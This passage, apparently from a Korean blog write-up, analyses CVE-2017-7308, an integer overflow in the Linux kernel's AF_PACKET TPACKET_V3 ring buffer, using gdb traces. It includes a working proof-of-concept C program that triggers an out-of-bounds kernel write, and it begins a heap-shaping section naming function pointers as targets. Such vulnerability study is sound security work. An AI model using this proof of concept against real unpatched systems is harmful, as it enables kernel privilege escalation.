#define BLK_HDR_LEN	(ALIGN(sizeof(struct tpacket_block_desc), V3_ALIGNMENT))
#define BLK_PLUS_PRIV(sz_of_priv) \
	(BLK_HDR_LEN + ALIGN((sz_of_priv), V3_ALIGNMENT))
```

<br>
이제 예제 코드를 통해 실제로 해당 구조체가 설정되는 과정을 살펴보자.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <linux/if_packet.h>
#include <sys/socket.h>
#include <netinet/if_ether.h>

int main()
{
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (s < 0)
    {
	    perror("[-] socket(AF_PACKET)");
	    exit(EXIT_FAILURE);
    }

    int v = TPACKET_V3;
    int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
    if (rv < 0) 
    {
	    perror("[-] setsockopt(PACKET_VERSION)");
	    exit(EXIT_FAILURE);
    }

    struct tpacket_req3 req;
    memset(&req, 0, sizeof(req));
    req.tp_block_size = 0x8000;
    req.tp_block_nr = 1024;
    req.tp_frame_size = 2048;
    req.tp_frame_nr = (0x8000 * 1024) / 2048;
    req.tp_retire_blk_tov = 100;
    req.tp_sizeof_priv = 1234;
    req.tp_feature_req_word = 0;

    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
    if (rv < 0) 
    {
	    perror("[-] setsockopt(PACKET_RX_RING)");
	    exit(EXIT_FAILURE);
    }
}
```

<br>
위의 예제 코드를 rb.c로 저장하여 컴파일 하고 파일 시스템에 복사한 후 qemu로 부팅을 한다. 아래는 소스 파일을 컴파일하여 파일 시스템에 복사하는 스크립트이다.

```bash
#!/bin/bash

# copy.sh src_file_name
# copy.sh rb.c

BASE_PATH=/home/lucid7/lke
EXP_PATH=$BASE_PATH/exploit
FS_PATH=$BASE_PATH/fs/stretch.img
MOUNT_PATH=/mnt/chroot
USER_HOME=$MOUNT_PATH/home/user
MOUNT=$(which mount)
UMOUNT=$(which umount)
CP=$(which cp)
SUDO=$(which sudo)
RM=$(which rm)
GCC=$(which gcc)

if [ "$#" -lt 1 ]; then
    echo "Usage: $0 src_file_name"
    exit
fi

SRC_NAME=$1
BIN_NAME=$(echo "$SRC_NAME" | cut -f 1 -d '.')
SRC_PATH=$EXP_PATH/$SRC_NAME
BIN_PATH=$EXP_PATH/$BIN_NAME

$RM $BIN_PATH
$GCC $SRC_PATH -o $BIN_PATH

$SUDO $MOUNT -o loop $FS_PATH $MOUNT_PATH
$SUDO $RM $USER_HOME/$BIN_NAME
$SUDO $CP -a $BIN_PATH $USER_HOME/
$SUDO $UMOUNT $MOUNT_PATH
```

<br>
복사가 완료되면 qemu를 시작하고 다른 terminal에서 gdb로 연결한다.

```bash
# terminal 1
./copy.sh rb.c
./start.sh

# terminal 2
gdb -x debug.gdb
```

<br>
terminal #2에서 gdb 연결이 완료되면 아래와 같이 packet_set_ring() 함수에 breakpoint를 걸자

```bash
b net/packet/af_packet.c:packet_set_ring
```
<a href="/assets/images/cve-2017-7308/gdb_set_bp.png"><img src="/assets/images/cve-2017-7308/gdb_set_bp.png" alt="gdb_set_bp"></a>


<br>
break point 설정이 완료되면 terminal #1에서 /home/user/rb 프로그램을 실행하자.
<a href="/assets/images/cve-2017-7308/rb_execute.png"><img src="/assets/images/cve-2017-7308/rb_execute.png" alt="rb_execute"></a>


<br>
terminal #2에서 breakpoint 가 걸리면서 아래와 같은 화면을 볼 수 있을 것이다.
<a href="/assets/images/cve-2017-7308/gdb_packet_set_ring.png"><img src="/assets/images/cve-2017-7308/gdb_packet_set_ring.png" alt="gdb_packet_set_ring"></a>


<br>
현대의 CPU는 성능상의 이유로 소스를 순차적으로 실행하지 않고, 컴파일 시에 최적화 작업을 하기 때문에 gdb의 source 화면과 assembly 화면이 서로 다를 수 있음을 감안해야 한다. 따라서 source 화면은 무시하고 disassembly 화면을 중점적으로 보도록 한다. 

또한 많은 부분이 매크로/최적화 되어 있어서 한 줄마다 breakpoint가 걸리지 않기 때문에 디버깅 하기가 쉽지 않다. 이점을 염두에 두고 ni 명령어를 이용해 차근차근 따라가보자.

가장 처음 breakpoint에 걸리면 위와 같이 prologue 작업을 시작하고, 변수들을 위한 register들을 셋팅한다.


```assembly
► 0xffffffff81872640 <packet_set_ring>       nop    dword ptr [rax + rax]
  0xffffffff81872645 <packet_set_ring+5>     push   rbp
  0xffffffff81872646 <packet_set_ring+6>     mov    rbp, rsp
  0xffffffff81872649 <packet_set_ring+9>     push   r15
  0xffffffff8187264b <packet_set_ring+11>    push   r14
  0xffffffff8187264d <packet_set_ring+13>    push   r13
  0xffffffff8187264f <packet_set_ring+15>    push   r12
  0xffffffff81872651 <packet_set_ring+17>    mov    r15d, edx
  0xffffffff81872654 <packet_set_ring+20>    push   rbx
  0xffffffff81872655 <packet_set_ring+21>    mov    r12, rsi
  0xffffffff81872658 <packet_set_ring+24>    xor    esi, esi
```

<br>
이후 ni로 쭉 진행하다가 보면 <packet_set_ring+233> 부분에서 아래와 같이 r9d의 값을 검사하는 부분이 나오는데, r9d의 값은 0x400인 것을 볼 수 있다. 이 부분은 kernel source 4184라인의 tp_block_nr의 값이 0인지 확인하는 부분이다. 따라서 r9d에 복사된 값의 원본인 r12+4는 req->tp_block_nr이고 r12가 tpacket_req가 저장된 곳임을 알 수 있다.
<a href="/assets/images/cve-2017-7308/gdb_packet_set_ring_tp_block_nr.png"><img src="/assets/images/cve-2017-7308/gdb_packet_set_ring_tp_block_nr.png" alt="gdb_packet_set_ring_tp_block_nr"></a>

<br>
<packet_set_ring+776> 부분에서는 r13의 값이 0인지 확인하는데, 이것은 소스의 rb->pg_vec 값을 검사하는 부분이다. rb는 packet_ring_buffer형 구조체 포인터이고 해당 구조체에서 pg_vec는 오프셋 0부분에 위치한다. 따라서 r13에는 packet_ring_buffer 구조체가 저장되어 있음을 알 수 있다.

바로 아래쪽의 <packet_set_ring+787> 부분을 보면 edx 값을 비교하는 부분이 나오는데, 이 부분은 kernel source 4190 근처의 TPACKET_VERSION을 체크하는 switch 구문이다. TPACKET_V3의 값은 2이므로 <packet_set_ring+811> 부분에서 jump 없이 진행될 것을 알 수 있다.

또한 edx에 값을 복사한 원래 주소 rbx + 0x4fc가 po->tp_version을 나타내는 값이므로 rbx는 packet_socket 구조체가 저장된 주소임을 확인할 수 있다.
<a href="/assets/images/cve-2017-7308/gdb_packet_set_ring_tp_version.png"><img src="/assets/images/cve-2017-7308/gdb_packet_set_ring_tp_version.png" alt="gdb_packet_set_ring_tp_version"></a>

<br>
우리의 테스트 소스는 TPACKET_V3을 설정하였으므로, <packet_set_ring+813> 부분에서 아래와 같이 po->tp_hdrlen 변수에 TPACKET3_HDRLEN 값을 저장한다. 그리고 해당 값은 0X68임을 알 수 있다. 

바로 다음 <packet_set_ring+823> 부분에서는 위에서 확인한  r12, 즉  req->tp_block_size 값을 검사한다. 그리고 <packet_set_ring+835>부분은 PAGE_ALIGNED(req->tp_block_size))를 하는 부분이며 마찬가지로 해당 값이 0인지를 검사한다.
<a href="/assets/images/cve-2017-7308/gdb_tpacket_set_ring_tp_hdrlen.png"><img src="/assets/images/cve-2017-7308/gdb_tpacket_set_ring_tp_hdrlen.png" alt="gdb_tpacket_set_ring_tp_hdrlen"></a>

<a href="/assets/images/cve-2017-7308/gdb_tpacket_set_ring_tp_hdrlen_value.png"><img src="/assets/images/cve-2017-7308/gdb_tpacket_set_ring_tp_hdrlen_value.png" alt="gdb_tpacket_set_ring_tp_hdrlen_value"></a>


<br>
<packet_set_ring+846>부터 <packet_set_ring+869> 까지는 아래 소스가 disassemble된 구간이다. 

```c
if (po->tp_version >= TPACKET_V3 &&
		    (int)(req->tp_block_size -
			  BLK_PLUS_PRIV(req_u->req3.tp_sizeof_priv)) <= 0)
```

```assembly
0xffffffff8187298e <+846>:	cmp    edx,0x1  				; po->tp_version >= TPACKET_V3
0xffffffff81872991 <+849>:	jbe    0xffffffff818729ab <packet_set_ring+875>

0xffffffff81872993 <+851>:	mov    esi,DWORD PTR [r12+0x14] ; req_u->req3.tp_sizeof_priv
0xffffffff81872998 <+856>:	lea    ecx,[rax-0x30]   		; 0x7fd0
0xffffffff8187299b <+859>:	lea    edx,[rsi+0x7]    		; BLK_PLUS_PRIV(req_u->req3.tp_sizeof_priv)
0xffffffff8187299e <+862>:	and    edx,0xfffffff8   		; BLK_PLUS_PRIV
0xffffffff818729a1 <+865>:	sub    ecx,edx
0xffffffff818729a3 <+867>:	test   ecx,ecx
0xffffffff818729a5 <+869>:	jle    0xffffffff818726a5 <packet_set_ring+101>
```

<br>
먼저 TPACKET_V3인지 po->tp_version 값을 확인한 다음 esi에 r12+0x14 지점의 값이 복사되는데 이 값은 0x4d2이다. 해당 값은 예제 소스에서 우리가 tp_sizeof_priv의 값으로 입력했던 값이다. 따라서 r12+0x14부분은 req->tp_sizeof_priv이다(req_u는 union으로써 req3 구조체를 가지고 있으므로 dword ptr로 해당 값을 가져온 것이다). 

ecx에는 rax-0x30의 결과값인 0x7fd0가 복사되는데, rax에는 tp_block_size인 0x8000이 저장되어 있다. edx에는 req->tp_sizeof_priv에 +7을 한 값이 저장된 후 and 연산에 의해 0x4d8이 된다. 이 값은 BLK_PLUS_PRIV(req_u->req3.tp_sizeof_priv)의 결과이다. 그리고 마지막으로 ecx에서 edx를 뺀 값을 확인한다.



<packet_set_ring+875>부터 <packet_set_ring+881> 까지는 아래 소스가 disassemble된 구간이다. 

```c
if (unlikely(req->tp_frame_size < po->tp_hdrlen +
					po->tp_reserve))
```

```assembly
0xffffffff818729ab <+875>:	mov    edx,DWORD PTR [rbx+0x504]    ; po->tp_reserve
0xffffffff818729b1 <+881>:	add    edx,DWORD PTR [rbx+0x500]    ; po->tp_hdrlen
0xffffffff818729b7 <+887>:	mov    ecx,DWORD PTR [r12+0x8]      ; req->tp_frame_size
0xffffffff818729bc <+892>:	cmp    ecx,edx
0xffffffff818729be <+894>:	jb     0xffffffff818726a5 <packet_set_ring+101>
```

<br>
이후 인라인 함수인 get_order() 함수와 alloc_pg_vec() 함수를 지나서 init_prb_bdqc()  함수 내 prb_open_block() 함수를 호출하는 부분에 도달한다. 대부분의 함수가 인라인 함수로 되어 있어 분석하기가 까다롭지만 다행히 prb_open_block() 함수는 인라인 함수로 되어 있지 않다. 따라서 아래와 같이 해당 함수에 breakpoint를 걸고 continue로 진행하자.

```bash
b *packet_set_ring+1624
```

<br>
break point가 걸리고 아래와 같은 화면을 볼 수 있다. 소스를 보면 해당 함수는 init_prb_bdqc() 함수 내에서 호출되는데, 호출될 때  `tpacket_kbdq_core`형 포인터 p1과 `tpacket_block_desc`형 포인터 pbd 두 개의 파라미터가 전달된다. x64 calling convection에서 첫번째, 파라미터는 `rdi` 레지스터, 두번째 파라미터는 `rsi` 레지스터를 통해 전달된다. 첫번째 파라미터 rdi의 값은 `0xffff88003d393318`, 두번째 파라미터 rsi의 값은 `0xffff88003b878000` 이다.
<a href="/assets/images/cve-2017-7308/prb_open_block1.png"><img src="/assets/images/cve-2017-7308/prb_open_block1.png" alt="prb_open_block1"></a>


<br>
이제 ni를 눌러 instruction을 실행하면 아래와 같이 prb_open_block 함수가 실행완료 후 리턴된다.
<a href="/assets/images/cve-2017-7308/prb_open_block2.png"><img src="/assets/images/cve-2017-7308/prb_open_block2.png" alt="prb_open_block2"></a>


<br>
이제 위의 구조체들의 설정이 완료되었을 것이다. 위에서 확인한 주소들을 아래와 같이 확인해 보자.

```assembly
pwndbg> p *(struct tpacket_kbdq_core *)0xffff88003d393318
```
<a href="/assets/images/cve-2017-7308/gdb_tpacket_kbdq_core.png"><img src="/assets/images/cve-2017-7308/gdb_tpacket_kbdq_core.png" alt="gdb_tpacket_kbdq_core"></a>

<br>
private area의 크기인 blk_sizeof_priv 값이 1234, block size인 kblk_size가 32768(0x8000), block의 갯수인 knum_blocks가 1024, retire_blk_tov가 100으로 우리가 예제 프로그램에서 설정한 값들이 제대로 들어있는 것을 확인할 수 있다.

이제 다음으로 수신된 패킷이 어떻게 처리되는지 확인해보자.


<br>
#### B. Packet 수신 처리

packet socket이 수신되었을 때 해당 packet을 처리하는 함수는 tpacket_rcv() 함수이다. 이 함수 역시 많은 기능이 있기에 exploit에 필요한 부분만 알아보도록 하자.

해당 함수의 원형은 아래와 같다.

```c
static int tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
		       struct packet_type *pt, struct net_device *orig_dev)
{
    ...
}
```

<br>
필요한 변수들을 초기화한 후 sock 구조체에서 packet_sock을 뽑아낸다.

```c
...
sk = pt->af_packet_priv;
po = pkt_sk(sk);
...
```


<br>
이후 SOCK_DGRAM이 아닐 경우 헤더를 추가하기 위해 buffer의 시작 지점에 공간을 추가하는 skb_push()를 실행한다.

```c
...
if (dev->header_ops) {
    if (sk->sk_type != SOCK_DGRAM)
        skb_push(skb, skb->data - skb_mac_header(skb));
    else if (skb->pkt_type == PACKET_OUTGOING) {
        /* Special case: outgoing packets have ll header at head */
        skb_pull(skb, skb_network_offset(skb));
    }
}
...
```
<br>
관련 함수들의 동작은 아래 그림을 참고하기 바란다.

<a href="/assets/images/cve-2017-7308/skb_functions.jpg"><img src="/assets/images/cve-2017-7308/skb_functions.jpg" alt="skb_functions"></a>

<br>
이어서 maclen, netoff, macoff 변수들을 계산한다.  exploit 시에 RAW SOCKET을 사용할 것이기 때문에 else 구문이 실행되게 된다. 

```c
if (sk->sk_type == SOCK_DGRAM) {
		macoff = netoff = TPACKET_ALIGN(po->tp_hdrlen) + 16 +
				  po->tp_reserve;
} else {
		unsigned int maclen = skb_network_offset(skb);
		netoff = TPACKET_ALIGN(po->tp_hdrlen +
				       (maclen < 16 ? 16 : maclen)) +
				       po->tp_reserve;
		if (po->has_vnet_hdr)
			netoff += sizeof(struct virtio_net_hdr);
		macoff = netoff - maclen;
}
```

<br>
아래는 sk_buff 구조체의 모습을 그림으로 간단하게 나타낸 것이다.
<a href="/assets/images/cve-2017-7308/sk_buff_structure-2.png"><img src="/assets/images/cve-2017-7308/sk_buff_structure-2.png" alt="sk_buff_structure-2"></a>

<br>
skb->head부터 skb->data까지를 `headroom`, skb->data부터 skb->tail까지를 `packet data`, skb->tail부터 skb->end까지를 `tailroom`이라고 한다. 각 포인터의 의미는 아래와 같다.

- skb->head: 실제 skb 저장공간의 첫 시작을 의미한다.
- skb->data: 현재 layer(L2~L4)가 다루어야 하는 위치를 의미한다.
- skb->len: 현재 layer 단계에서의 skb->data의 시작부분으로부터의 길이
- skb->tail: 현재 skb에 저장된 마지막 위치를 의미함. skb가 할당된 직후 시점에서는 data와 위치가 같다가, L2 ~ L4가 채워지면서 뒤로 늘어나게 됨
- skb->end: skb 저장공간의 맨 마지막을 의미



아래는 위의 그림을 조금 더 자세하게 나타낸 그림이다.

<a href="/assets/images/cve-2017-7308/sk_buff_structure.png"><img src="/assets/images/cve-2017-7308/sk_buff_structure.png" alt="sk_buff_structure"></a>

<br>
packet data부분은 MAC-Header, IP-Header, TCP(UDP)-Header, TCP(UDP)-Data로 구분되어 있다. skb에서의 각 포인터의 의미는 아래와 같다.

- skb->mac_header: L2 layer의 entry 위치
- skb->mac_len: L2 header의 크기
- skb->newtork_header: L3 layer의 entry 위치
- skb->transport_header: L4 layer의 entry 위치

> mac_header 와 network_header 사이에는 L2 header 만 꽉 채워진 것이 아니고 의미없는 공간이 존재할 수도 있다

<br>
다시 소스로 돌아가서 maclen의 값은 skb_network_offset() 함수를 통해 결정되는데, 결국 이 값은 skb->head + skb->network_header - skb->data의 결과이다.  따라서 maclen은 L2 header인 MAC-Header의 크기를 나타내게 된다.

다음으로 netoff를 계산하는데, 앞에서 계산한 maclen이 16보다 작을 경우에는 해당 값을 16으로 고정시킨다. 그리고 여기에 tp_hdrlen과 tp_reserve 값을 더한다. 만약 virtior herder도 추가되었다면 virtio_net_hdr 구조체의 크기도 더해준다. 이제 netoff는 packet data의 시작점에서 header를 제외한 실제 data까지의 오프셋을 가지게 된다. 이제 위에서 구한 두 개의 값 netoff와 maclen의 차를 구함으로써, MAC-Header의 오프셋을 macoff 변수에 저장하게 된다. macoff가 실제로 가리키는 값은 Ethernet Frame에서 Ethernet Header의 offset을 나타낸다.



다음으로 if문과 else if문 모두 건너뛰고 spin_lock()을 거쳐 packet_current_rx_farme() 함수에 도달한다. TPACKET_V3이므로 __packet_lookup_frame_in_block() 함수를 호출하게 된다.

```c
static void *packet_current_rx_frame(struct packet_sock *po,
					    struct sk_buff *skb,
					    int status, unsigned int len)
{
	char *curr = NULL;
	switch (po->tp_version) {
	case TPACKET_V1:
	case TPACKET_V2:
		curr = packet_lookup_frame(po, &po->rx_ring,
					po->rx_ring.head, status);
		return curr;
	case TPACKET_V3:
		return __packet_lookup_frame_in_block(po, skb, status, len);
	default:
		WARN(1, "TPACKET version not supported\n");
		BUG();
		return NULL;
	}
}
```

<br>
__packet_lookup_frame_in_block() 함수는 이름처럼 현재 block내 패킷이 저장가능한 frame을 찾아 반환하는 기능을 가지고 있다. 해당 함수의 소스는 아래와 같다.

```c
static void *__packet_lookup_frame_in_block(struct packet_sock *po,
					    struct sk_buff *skb,
						int status,
					    unsigned int len
					    )
{
	struct tpacket_kbdq_core *pkc;
	struct tpacket_block_desc *pbd;
	char *curr, *end;

	pkc = GET_PBDQC_FROM_RB(&po->rx_ring);
	pbd = GET_CURR_PBLOCK_DESC_FROM_CORE(pkc);

	...

	smp_mb();
	curr = pkc->nxt_offset;
	pkc->skb = skb;
	end = (char *)pbd + pkc->kblk_size;

	/* first try the current block */
	if (curr+TOTAL_PKT_LEN_INCL_ALIGN(len) < end) {
		prb_fill_curr_block(curr, pkc, pbd, len);
		return (void *)curr;
	}

	/* Ok, close the current block */
	prb_retire_current_block(pkc, po, 0);

	/* Now, try to dispatch the next block */
	curr = (char *)prb_dispatch_next_block(pkc, po);
	if (curr) {
		pbd = GET_CURR_PBLOCK_DESC_FROM_CORE(pkc);
		prb_fill_curr_block(curr, pkc, pbd, len);
		return (void *)curr;
	}

	...
}
```

<br>
`rx_ring`으로부터 `tpacket_kbdq_core`의 위치를 찾고 tpacket_kbdq_core에서 `tpacket_block_desc`의 위치를 찾는다. tpacket_kbdq_core의 nxt_offset이 가리키는 지점, 즉 첫 번째 block의 크기를 검사해서 prb_fill_curr_block() 함수를 호출한다. 만약 첫 번째 block의 크기가 적절하지 않을 경우 prb_dispatch_next_block() 함수를 이용하여 다음 block으로 이동하여 prb_fill_curr_block() 함수를 호출한다. prb_fill_curr_block() 함수는 현재 선택된 block의 여러 정보를 채우게 되고, 이 작업이 완료되면 해당 block의 주소를 반환한다.

공격자가 private area 값을 수정하여 조작한 값은 최종적으로 아래 소스에서 사용되는데, 우리가 주목해야 할 부분은 바로 여기이다.

```c
curr = pkc->nxt_offset;
```

<br>
nxt_offset이 integer overflow로 인해 block의 크기보다 더 큰 값을 가짐으로써, curr이 block을 넘어서는 메모리 지점을 가리키게 된다.
이제 packet을 저장할 block을 찾았으므로 아래와 같이 skb_copy_bits() 함수에서 data를 복사한다.

```c
skb_copy_bits(skb, 0, h.raw + macoff, snaplen);
```

<br>
위의 함수 호출 시에 h.raw + macoff의 값을 offset으로 전달받아 data 복사가 일어나는데, h.raw의 값은 이전 packet_current_rx_frame() 함수에서 구한 block의 위치이다. 즉 정상적인 block의 위치가 아닌 다른 값이 전달됨으로써, block을 넘어서는 지점에 data가 복사되게 된다.

data 복사가 끝나고 나면, 2292라인에서 tpacket3_hdr 구조체의 내용을 아래와 같이 채운다.

```
case TPACKET_V3:
		/* tp_nxt_offset,vlan are already populated above.
		 * So DONT clear those fields here
		 */
		h.h3->tp_status |= status;
		h.h3->tp_len = skb->len;
		h.h3->tp_snaplen = snaplen;
		h.h3->tp_mac = macoff;
		h.h3->tp_net = netoff;
		h.h3->tp_sec  = ts.tv_sec;
		h.h3->tp_nsec = ts.tv_nsec;
		memset(h.h3->tp_padding, 0, sizeof(h.h3->tp_padding));
		hdrlen = sizeof(*h.h3);
		break;
```

<br>
여기까지 tpacket_rcv() 함수의 주요기능을 살펴보았다.
이제 아래 예제코드를 실행하여 tpacket_rcv() 함수를 디버깅해 보도록 하자.
<br>해당 코드는 exploit을 기반으로 만들었다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <linux/if_packet.h>
#include <sys/socket.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>

int main()
{
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (s < 0)
    {
	    perror("[-] socket(AF_PACKET)");
	    exit(EXIT_FAILURE);
    }

    int v = TPACKET_V3;
    int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
    if (rv < 0) 
    {
	    perror("[-] setsockopt(PACKET_VERSION)");
	    exit(EXIT_FAILURE);
    }

    struct tpacket_req3 req;
    memset(&req, 0, sizeof(req));

    req.tp_block_size = 0x1000;
    req.tp_block_nr = 2;
    req.tp_frame_size = 0x100;
    req.tp_frame_nr = (0x1000 * 2) / 0x100;
    req.tp_retire_blk_tov = 0x41424344;
    req.tp_sizeof_priv = 0x80005000;
    req.tp_feature_req_word = 0;

    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
    if (rv < 0) 
    {
	    perror("[-] setsockopt(PACKET_RX_RING)");
	    exit(EXIT_FAILURE);
    }

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = PF_PACKET;
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = if_nametoindex("lo");
    sa.sll_hatype = 0;
    sa.sll_pkttype = 0;
    sa.sll_halen = 0;

    rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
    if (rv < 0)
    {
	    perror("[-] bind(AF_PACKET)");
	    exit(EXIT_FAILURE);
    }

    int sock = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
    if (sock == -1)
    {
	    perror("[-] socket(SOCK_RAW)");
	    exit(EXIT_FAILURE);
    }

    struct sockaddr_ll sa2;
    memset(&sa2, 0, sizeof(sa2));
    sa2.sll_ifindex = if_nametoindex("lo");
    sa2.sll_halen = ETH_ALEN;

    if (sendto(sock, "AAAABBBCCCCDDDD", 16, 0, (struct sockaddr *)&sa2, sizeof(sa2)) < 0) 
    {
	    perror("[-] sendto(SOCK_RAW)");
	    exit(EXIT_FAILURE);
    }

    return 0;
}
```

block의 크기는 0x1000, block의 갯수는 2개, frame의 크기는 0x100, frame의 갯수는 32개, private area의 크기는 0x80005000로 설정하였다.


tpacket_rcv() 함수에 breakpoint를 걸고 poc인 snd를 실행하면 breakpoint가 걸리는데 ni로 쭉 진행하다가보면 아래와 같이 tpacket_rcv+156 지점을 만나게 된다.
<a href="/assets/images/cve-2017-7308/gdb_tpacket_rcv_SOCK_DGRAM.png"><img src="/assets/images/cve-2017-7308/gdb_tpacket_rcv_SOCK_DGRAM.png" alt="gdb_tpacket_rcv_SOCK_DGRAM"></a>


<br>
해당 부분은 sk->sk_type의 값이 SOCKET_DGRAM 값인 2인지 비교하는 곳이다. 여기서 r12는 sk 변수임을 알 수 있고, 코드에서 RAW_SOCK으로 설정하였기 때문에 아래 부분에서 skb_push() 함수를 통해 관련된 header를 추가하기 위해 buffer를 조정한다.
<a href="/assets/images/cve-2017-7308/gdb_tpacket_rcv_sk_push.png"><img src="/assets/images/cve-2017-7308/gdb_tpacket_rcv_sk_push.png" alt="gdb_tpacket_rcv_sk_push"></a>

<br>
위의 어셈블리 코드를 보면 첫 번째 파라미터 rdi에 rbx의 값이 전달되는 것을 볼 수 있다. 해당 함수는 아래와 같이 호출되므로, rdi와 rbx는 skb 변수임을 알 수 있다.

```c
skb_push(skb, skb->data - skb_mac_header(skb));
```

<br>
tpacket_rcv+371 부분은 maclen을 계산하는 부분이다.
<a href="/assets/images/cve-2017-7308/gdb_tpacket_rcv_maclen.png"><img src="/assets/images/cve-2017-7308/gdb_tpacket_rcv_maclen.png" alt="gdb_tpacket_rcv_maclen"></a>
rbx+0xc4는 skb->network_header를 r12+0x500는 po->tp_hdrlen을 나타낸다. rbx+0xd0는 skb->head, rbx+0xd8는 skb->data를 나타낸다. 계산 결과 maclen에 저장되는 값은 0xe이다.


<br>
tpacket_rcv+405부터 tpacket_rcv+448까지는 netoff와 macoff를 계산하는 과정이다.
<a href="/assets/images/cve-2017-7308/gdb_tpacket_rcv_macoff.png"><img src="/assets/images/cve-2017-7308/gdb_tpacket_rcv_macoff.png" alt="gdb_tpacket_rcv_macoff"></a>

tpacket_rcv+418 부분은 po->tp_reserve를 더하는 부분인데, 해당 값이 0이기 때문에 값의 변화가 없다. tpacket_rcv+427 부분에서 netoff에 저장되는 최종 값은 0x60이다. tpacket_rcv+448에서는 앞에서 구했던 netoff와 maclen의 값을 빼서 macoff에 저장하는데, 저장되는 최종 값은 0x52이다.


<br>
tpacket_rcv+521 부분부터는 packet_current_rx_frame() 함수 안으로 들어오게 된다. TPACKET_V3이기 때문에 tpacket_rcv+547 지점에서 __packet_lookup_frame_in_block() 함수로 진입하게 된다.
<a href="/assets/images/cve-2017-7308/gdb_tpacket_rcv___packet_lookup_frame_in_block.png"><img src="/assets/images/cve-2017-7308/gdb_tpacket_rcv___packet_lookup_frame_in_block.png" alt="gdb_tpacket_rcv___packet_lookup_frame_in_block"></a>



<br>
tpacket_rcv+628부터는 첫 번째 block의 크기를 검사하는 로직을 나타낸다.
<a href="/assets/images/cve-2017-7308/gdb_tpacket_rcv_calc_size.png"><img src="/assets/images/cve-2017-7308/gdb_tpacket_rcv_calc_size.png" alt="gdb_tpacket_rcv_calc_size"></a>

예제 코드에서 private area의 크기를 0x80005000로 넣었기 때문에, 첫 번째 block에 대한 크기를 검사하는 if문을 통과할 것이다.

tpacket_rcv+631 지점에서 rcx에 block의 크기인 0x1000이 저장되고, 다음 지점에서 r9에 nxt_offset이 저장된다. 이 때 r9는 curr 변수로써 이 변수에 저장되는 값은 0xffff88003d3d6030이다.

> 첫번째 block의 위치 : 0xffff88003d3d6030



계속 코드를 살펴보면, tpacket_rcv+658 지점에서 end 변수의 값이 계산되어 저장되고, tpacket_rcv+664 지점에서는 curr + TOTAL_PKT_LEN_INCL_ALIGN(len)가 계산된 값이 rdx에 저장된다.

이제 두 값을 비교하는데 rdx에 저장된 값은 0xffff88003d3d6098, rcx에 저장된 값은 0xffff88003d3d2000이다. 현재 block의 크기가 end보다 크기 때문에 if문 진입에 실패하고 다음으로 넘어가게 된다.

| Register                                    | Value              |
| ------------------------------------------- | ------------------ |
| RDX \| curr + TOTAL_PKT_LEN_INCL_ALIGN(len) | 0xffff88003d3d6098 |
| RCX \| end                                  | 0xffff88003d3d2000 |


<br>
다음 block의 위치를 가져오기 위해 prb_dispatch_next_block() 함수가 호출되고 그 결과가 다시 curr 변수인 r9 레지스터에 저장된다.
<a href="/assets/images/cve-2017-7308/gdb_tpacket_rcv_next_block.png"><img src="/assets/images/cve-2017-7308/gdb_tpacket_rcv_next_block.png" alt="gdb_tpacket_rcv_next_block"></a>

r9에 저장된 두 번째 block의 위치는 0xffff88003ce16030 이다. 첫 번째 block의 주소는 0xffff88003d3d6030 이고 block의 크기는 0x1000이므로 정상적인 두 번째 block의 위치는 아래와 같은 값을 가져야 한다.
$$
0xffff88003d3d6030 + 0x1000 = 0xffff88003d3d7030
$$
하지만 r9에 저장된 두 번째 block의 위치는 private area의 크기에 의해 다른 값을 가지게 된 것이다.

| 1'st block         | 2'st block         |
| ------------------ | ------------------ |
| 0xffff88003d3d6030 | 0xffff88003ce16030 |


<br>
이후 두 번째 block의 값이 0인지만 검사한 다음 block의 크기를 확인하지 않고 prb_fill_curr_block() 함수를 호출한다.
<a href="/assets/images/cve-2017-7308/gdb_tpacket_rcv_call_prb_fill_curr_block.png"><img src="/assets/images/cve-2017-7308/gdb_tpacket_rcv_call_prb_fill_curr_block.png" alt="gdb_tpacket_rcv_call_prb_fill_curr_block"></a>



아래는 prb_fill_curr_block(curr, pkc, pbd, len) 함수가 호출되기 전의 register들의 값이다. x64 calling convention에서 1~4번째 파라미터는 차례대로 rdi, rsi, rdx, rcx register에 저장된다.
<a href="/assets/images/cve-2017-7308/gdb_tpacket_rcv_param_prb_fill_curr_block.png"><img src="/assets/images/cve-2017-7308/gdb_tpacket_rcv_param_prb_fill_curr_block.png" alt="gdb_tpacket_rcv_param_prb_fill_curr_block"></a>

| Register    | Value              |
| ----------- | ------------------ |
| RDI \| curr | 0xffff88003ce16030 |
| RSI \| pkc  | 0xffff88003cc9ab18 |
| RDX \| pbb  | 0xffff88003ce1100c |
| RCX \| len  | 0x0000000200005030 |


<br>
이제 private area의 영역 크기를 조작하여 block의 주소를 벗어난 임의의 메모리에 접근할 수 있다는 것을 확인하였다. 다음으로는 메모리 어느 지점에 접근해야 하는지 메모리를 정렬하는 방법에 대해 알아보자.


### 3. Heap Shaping

Overflow가 일어났을 때 private area의 값이 최종적으로 저장되는 변수는 다음과 같다.

```c
struct packet_socket -> struct packet_ring_buffer -> struct tpacket_kbdq_core -> blk_sizeof_priv
```


<br>
`blk_sizeof_priv` 변수는 unsigned short형으로 정의되어 있다. 따라서 private area에서 integer overflow를 발생시켰을 때 2바이트(0 ~ 65,535)만큼의 offset을 조절할 수 있게 된다.  이 offset 범위를 감안하여 원문의 저자가 선택한 attack vector는 아래와 같이 packet_socket 구조체 안에 존재하는 2개의 함수 포인터다.

```c
struct packet_socket -> xmit
struct packet_socket -> struct packet_ring_buffer -> struct tpacket_kbdq_core -> retire_blk_timer -> func
```
<br>
위의 함수 포인터들의 원형은 아래와 같다.

```c
int (*xmit)(struct sk_buf *skb);

void (*function)(unsigned long);
```

